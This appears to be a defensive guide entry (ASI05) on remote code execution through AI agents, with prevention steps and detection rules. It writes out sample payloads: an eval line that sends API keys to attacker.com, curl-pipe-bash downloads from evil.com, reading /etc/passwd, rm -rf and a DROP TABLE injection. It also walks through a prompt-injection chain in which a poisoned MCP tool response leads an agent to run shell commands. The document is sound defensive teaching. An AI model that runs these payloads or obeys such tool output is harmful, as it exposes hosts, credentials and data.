## ASI05 – Unexpected Code Execution / RCE

**Description:**

Unexpected Code Execution occurs when natural-language execution paths unlock dangerous avenues for remote code execution within or through AI agents. Agents frequently interact with code execution primitives — `eval()`, shell commands, dynamic imports, WebAssembly — either directly as tool capabilities or indirectly through compromised tool responses. Attackers exploit these pathways to achieve arbitrary code execution on the agent's host system.

This category covers: eval injection (dynamic code execution via `eval()`, `new Function()`, `vm.runInNewContext()`), shell metacharacter injection in tool arguments, dynamic import exploitation (user-controlled module loading paths), and indirect tool injection (prompt injection payloads in tool responses that trigger code execution).

**Common Examples of Vulnerability:**

1. Example 1: **Eval Injection:** A tool evaluates user expressions by calling `eval(userInput)` to compute results dynamically. An attacker provides: `require('child_process').exec('curl https://attacker.com/steal?data='+process.env.API_KEY)`. The tool executes arbitrary code with the agent's permissions. Other vectors include `new Function('return ' + code)` (Function constructor), `vm.runInNewContext(untrustedCode, sandbox)` (Node.js VM escape), and Python's `exec()`/`eval()`.

2. Example 2: **Shell Metacharacter Injection:** Tool arguments intended as simple strings contain shell metacharacters that trigger command injection: `filename; rm -rf /tmp/data` (semicolon injection), `$(cat /etc/passwd)` (subshell substitution), `` `curl http://evil.com/payload.sh | bash` `` (backtick execution), or `log output && curl http://attacker.com/exfil?data=secret` (logical AND chain). These exploit tools that pass arguments to shell commands without proper escaping.

3. Example 3: **Dynamic Import with User-Controlled Paths:** A tool loads plugins dynamically using `import(pluginPath)` where `pluginPath` is user-provided. An attacker supplies a path to a malicious module, achieving code execution through the module loading mechanism. This applies to JavaScript `import()` and `require()`, Python `__import__()` and `importlib.import_module()`, native `dlopen()`/`LoadLibrary()`, and `WebAssembly.instantiate()`.

**How to Prevent:**

1. Prevention Step 1: **Eliminate Dynamic Code Execution:** Remove `eval()`, `new Function()`, and `vm.runInNewContext()` from tool implementations. Use safe expression parsers (e.g., math.js for calculations) instead of evaluating arbitrary code. ATR-2026-110 (Eval Injection) detects all common dynamic code execution primitives across JavaScript, Python, and Node.js, including sandbox escape attempts via `process.binding` and `Reflect.construct`.

2. Prevention Step 2: **Shell Argument Escaping:** Never pass tool arguments directly to shell commands. Use parameterized execution (e.g., `execFile` instead of `exec` in Node.js, `subprocess.run` with array arguments instead of shell=True in Python). ATR-2026-111 (Shell Escape) detects 6 categories of metacharacter injection: semicolons, `$()` subshells, backticks, logical operators, pipes, and null byte/newline injection.

3. Prevention Step 3: **Static Import Paths:** Use allowlists for permitted module paths. Block dynamic `import()` and `require()` with variable (non-literal) arguments. ATR-2026-112 (Dynamic Import Exploitation) specifically detects non-literal paths in `import()`, `require()`, `__import__()`, `dlopen()`, and `WebAssembly.instantiate()`, distinguishing safe literal imports from dangerous variable-based loading.

**Example Attack Scenarios:**

Scenario #1: A malicious MCP server is installed as a VS Code extension. When the agent invokes a tool from this server, the tool response contains a prompt injection payload that instructs the agent to execute a shell command. The agent, trusting the tool output, passes the command to its code execution capability. The attacker achieves RCE on the developer's workstation with the developer's permissions — accessing source code, credentials, and cloud infrastructure. This was documented in CVE-2025-49150 (Cursor RCE via MCP) and CVE-2025-53773 (VS Code Copilot auto-approve escalation). The attack chain: malicious MCP server -> poisoned tool response -> prompt injection -> agent executes shell command -> full system compromise.

Scenario #2: An agent has a database query tool that constructs commands by interpolating user input: `psql -c "SELECT * FROM users WHERE name='${input}'"`. An attacker provides: `'; DROP TABLE users; --` (SQL injection) or `$(curl http://evil.com/shell.sh | bash)` (shell injection via subshell). The semicolon breaks out of the intended command, and the subshell executes an arbitrary download-and-execute chain. ATR-2026-111 detects the shell metacharacters (`;`, `$()`, backticks, `&&`, `||`, `|`) followed by dangerous commands (curl, wget, bash, python, rm). ATR-2026-066 (Parameter Injection) provides additional detection for SQL injection, path traversal, and template injection patterns in tool arguments.

**Reference Links:**

1. [ATR-2026-110: Eval Injection](https://github.com/Agent-Threat-Rule/agent-threat-rules): Detects eval(), new Function(), vm.runInNewContext(), child_process, and sandbox escape primitives.
2. [ATR-2026-111: Shell Metacharacter Injection](https://github.com/Agent-Threat-Rule/agent-threat-rules): 6 categories: semicolons, subshells, backticks, logical operators, pipes, null bytes.
3. [CVE-2025-49150](https://nvd.nist.gov/vuln/detail/CVE-2025-49150): Cursor RCE via malicious MCP server.
4. [CVE-2025-53773](https://nvd.nist.gov/vuln/detail/CVE-2025-53773): VS Code Copilot auto-approve escalation.
5. [CVE-2026-25253](https://nvd.nist.gov/vuln/detail/CVE-2026-25253): OpenClaw RCE via auth token exfiltration (CVSS 8.8).
